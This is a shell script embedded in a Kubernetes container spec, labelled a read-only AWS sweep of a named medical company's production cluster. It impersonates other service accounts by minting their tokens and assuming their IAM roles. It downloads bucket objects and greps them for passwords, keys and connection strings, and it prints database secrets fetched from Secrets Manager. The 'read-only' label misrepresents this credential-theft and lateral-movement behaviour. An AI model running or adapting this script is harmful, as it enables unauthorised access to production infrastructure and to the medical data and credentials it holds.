containers.name: probe
command:
#!/bin/sh
# i2807 read-only AWS surface sweep (stage/prod lazamedical EKS)
set -u
ENVN="prod01"
BUCKETS="lazamedical-dp-prod01-usw2-airflow-bucket lazamedical-dp-prod01-usw2-athena-bucket lazamedical-dp-prod01-usw2-cornerstone-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-data-management-portal-ui-bucket lazamedical-dp-prod01-usw2-dicom-structure-bucket lazamedical-dp-prod01-usw2-glue-asset-bucket lazamedical-dp-prod01-usw2-glue-crawler-s3-bucket lazamedical-dp-prod01-usw2-green-bucket lazamedical-dp-prod01-usw2-imednet-sync-bucket lazamedical-dp-prod01-usw2-imfusion-bucket lazamedical-dp-prod01-usw2-imfusion-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-ingestion-bucket lazamedical-dp-prod01-usw2-ingestion-failure-bucket lazamedical-dp-prod01-usw2-lambda-code-s3-bucket lazamedical-dp-prod01-usw2-lps-bucket lazamedical-dp-prod01-usw2-metadata-parquet-bucket lazamedical-dp-prod01-usw2-mlflow-artifact-storage lazamedical-dp-prod01-usw2-png-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-red-bucket lazamedical-dp-prod01-usw2-rekognition-s3-bucket lazamedical-dp-prod01-usw2-temp-dicom-csv-reports-storage lazamedical-dp-prod01-usw2-temp-dicom-frame-storage lazamedical-dp-prod01-usw2-temp-storage-bucket-name lazamedical-dp-prod01-usw2-yellow-bucket lazamedical-prod01-usw2-bastion-bucket lazamedical-prod01-usw2-cloudtrail-01-logs lazamedical-prod01-usw2-cloudtrail-02-logs lazamedical-prod01-usw2-dp-ingestion-bucket lazamedical-prod01-usw2-log-bucket lazamedical-prod01-usw2-s3-bucket lazamedical-prod01-usw2-user-management-ui-bucket"
MYSQLSEC="lazamedical-prod01-usw2-mysql-1-db-secret"
PGSEC="lazamedical-dp-prod01-usw2-postgresql-db-secret"
PG1SEC="lazamedical-dp-prod01-usw2-postgresql-db1-secret"
API=https://kubernetes.default.svc
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2807 START env=$ENVN utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip unzip coreutils >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 100)"
export AWS_DEFAULT_REGION=us-west-2
echo "PODENV role_arn=${AWS_ROLE_ARN:-<none>} token_file=${AWS_WEB_IDENTITY_TOKEN_FILE:-<none>} region=${AWS_REGION:-<none>}"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
echo "SELF_ID $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | cut -c1-300)"
# ---- enumerate IRSA service accounts ----
SAJ=$(get "$API/api/v1/serviceaccounts?limit=2000")
echo "$SAJ" | jq -r '.items[]? | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | "\(.metadata.namespace)|\(.metadata.name)|\(.metadata.annotations["eks.amazonaws.com/role-arn"])"' > /tmp/sas.txt 2>/dev/null
echo "IRSA_COUNT=$(wc -l < /tmp/sas.txt)"
while IFS='|' read -r ns sa arn; do echo "IRSA $ns $sa $arn"; done < /tmp/sas.txt

assume(){
  ns=$1; sa=$2; sess=$3
  AROLE=$(grep "^$ns|$sa|" /tmp/sas.txt | cut -d'|' -f3)
  [ -z "${AROLE:-}" ] && { echo "NO_ROLE $ns/$sa"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$ns/serviceaccounts/$sa/token" "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\",\"spec\":{\"audiences\":[\"sts.amazonaws.com\"],\"expirationSeconds\":3600}}")
  WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
  [ -z "$WT" ] && { echo "TOKEN_FAIL $ns/$sa $(echo "$TK"|tr '\n' ' '|cut -c1-160)"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AROLE" --role-session-name "$sess" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $ns/$sa $(echo "$RES"|tr '\n' ' '|cut -c1-220)"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  CUR="$ns/$sa"; CURARN="$AROLE"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CUR=""; }

cap(){
  svc=$1; shift
  OUT=$("$@" 2>&1); RC=$?
  echo "CAP[$CUR] $svc rc=$RC $(echo "$OUT" | tr '\n' ' ' | cut -c1-260)"
}

echo "===PHASE1 role capabilities"
while IFS='|' read -r ns sa arn; do
  assume "$ns" "$sa" "i2807a" || continue
  echo "===ROLE $ns/$sa $arn"
  echo "IDENT $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | cut -c1-320)"
  cap secretsmanager aws secretsmanager list-secrets --max-results 5 --region us-west-2 --output json
  cap ssm aws ssm describe-parameters --max-results 5 --region us-west-2 --output json
  cap s3 aws s3api list-buckets --output json
  cap dynamodb aws dynamodb list-tables --limit 5 --region us-west-2 --output json
  cap sqs aws sqs list-queues --max-results 5 --region us-west-2 --output json
  cap sns aws sns list-topics --output json
  cap ecr aws ecr describe-repositories --max-results 5 --region us-west-2 --output json
  cap rds aws rds describe-db-instances --max-records 5 --region us-west-2 --output json
  cap kms aws kms list-keys --limit 5 --region us-west-2 --output json
  cap lambda aws lambda list-functions --max-items 5 --region us-west-2 --output json
  RN=${arn##*/}
  cap iamget aws iam get-role --role-name "$RN" --output json
  cap iaminline aws iam list-role-policies --role-name "$RN" --output json
  cap iamattached aws iam list-attached-role-policies --role-name "$RN" --output json
  unassume
done < /tmp/sas.txt

echo "===PHASE2 s3 bucket enumeration (role-major, skip already OK)"
: > /tmp/rem.txt; for b in $BUCKETS; do echo $b >> /tmp/rem.txt; done
: > /tmp/okb.txt
IDX=0
for pair in "s3-ingestion|s3-ingestion-sa" "data-management|data-management-sa" "user-management-service|user-management-service-sa" "metadata-extraction|metadata-extraction-sa" "de-identifier|de-identifier-sa" "notification-service|notification-service-sa" "audit-log|audit-log-sa" "authorization-service|authorization-service-sa"; do
  ns=${pair%%|*}; sa=${pair##*|}
  [ -s /tmp/rem.txt ] || break
  assume "$ns" "$sa" "i2807b" || continue
  echo "===S3ROLE $ns/$sa remaining=$(wc -l < /tmp/rem.txt)"
  : > /tmp/rem2.txt
  while read -r B; do
    case "$B" in *.s3.amazonaws.com) echo "S3SKIP $B"; continue;; esac
    OUT=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 20 --region us-west-2 --output json 2>&1)
    RC=$?
    if [ $RC -eq 0 ]; then
      N=$(echo "$OUT" | jq '.Contents|length' 2>/dev/null)
      echo "S3OK $B n=$N"
      echo "$B" >> /tmp/okb.txt
      echo "$OUT" | jq -r '.Contents[]? | "  KEYB \(.Size) \(.Key)"' | head -8
      case "$B" in
        *lambda-code*|*glue-asset*|*glue-crawler*|*portal-ui*|*viewer-remote-ui*|*bastion*|*usw2-s3-bucket|*mlflow-artifact*|*airflow*|*athena*|*temp-storage*|*ingestion-failure*)
          LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --region us-west-2 --output json 2>&1)
          echo "$LO" | jq -r '.Contents[]? | "  OBJ \(.Size) \(.Key)"' | head -15
          echo "$LO" | jq -r --arg B "$B" '.Contents[]? | select(.Size < 1500000) | "\(.Size) \(.Key)"' 2>/dev/null | sort -n | head -2 > /tmp/pick.txt
          while read -r SZ KEY; do
            [ -z "${SZ:-}" ] && continue
            [ $IDX -ge 10 ] && break
            IDX=$((IDX+1))
            aws s3api get-object --bucket "$B" --key "$KEY" "/tmp/o$IDX" --region us-west-2 >/dev/null 2>/tmp/gerr.txt
            GRC=$?
            echo "GET $B/$KEY rc=$GRC bytes=$(wc -c < /tmp/o$IDX 2>/dev/null) size=$SZ"
            if [ $GRC -eq 0 ]; then
              if unzip -l "/tmp/o$IDX" >/tmp/zl.txt 2>/dev/null; then
                echo "  ZIPLIST $(head -c 400 /tmp/zl.txt | tr '\n' ' ')"
                unzip -p "/tmp/o$IDX" '*config*' 2>/dev/null | grep -aEio "(password|secret|token|api[_-]?key|AKIA[0-9A-Z]{16}|jdbc:[a-z]+:|mysql://|postgres://|redis://|sk-[A-Za-z0-9]{16,})[^\"',; ]{0,80}" | head -5 | sed 's/^/  ZIPHIT /'
                unzip -p "/tmp/o$IDX" '*\.env*' 2>/dev/null | head -c 600 | sed 's/^/  ZIPENV /'
              else
                echo "  HEAD $(head -c 220 /tmp/o$IDX | tr '\n' ' ')"
                grep -aEio "(password|passwd|secret|token|api[_-]?key|access[_-]?key|AKIA[0-9A-Z]{16}|jdbc:[a-z]+:|mysql://|postgres://|redis://|sk-[A-Za-z0-9]{16,}|BEGIN [A-Z ]*PRIVATE KEY)[^\"',; ]{0,80}" "/tmp/o$IDX" 2>/dev/null | head -6 | sed 's/^/  HIT /'
              fi
            fi
          done < /tmp/pick.txt
          ;;
      esac
    else
      echo "S3NO $B $(echo "$OUT" | tr '\n' ' ' | cut -c1-110)"
      echo "$B" >> /tmp/rem2.txt
    fi
  done < /tmp/rem.txt
  cp /tmp/rem2.txt /tmp/rem.txt
  unassume
done
echo "S3_SUMMARY ok=$(wc -l < /tmp/okb.txt) rem=$(wc -l < /tmp/rem.txt) objs=$(echo $IDX)"

echo "===PHASE3 secretsmanager GetSecretValue (known high-value names)"
for pair in "s3-ingestion|s3-ingestion-sa" "user-management-service|user-management-service-sa" "data-management|data-management-sa"; do
  ns=${pair%%|*}; sa=${pair##*|}
  assume "$ns" "$sa" "i2807c" || continue
  for S in "$MYSQLSEC" "$PGSEC" "$PG1SEC"; do
    V=$(aws secretsmanager get-secret-value --secret-id "$S" --query SecretString --output text --region us-west-2 2>/tmp/e.txt); RC=$?
    if [ $RC -eq 0 ]; then echo "SECRET_OK $S = $(echo "$V" | head -c 1400)"; else echo "SECRET_NO $S $(head -c 130 /tmp/e.txt | tr '\n' ' ')"; fi
  done
  unassume
done
echo "===I2807 DONE env=$ENVN utc=$(date -u +%FT%TZ)==="
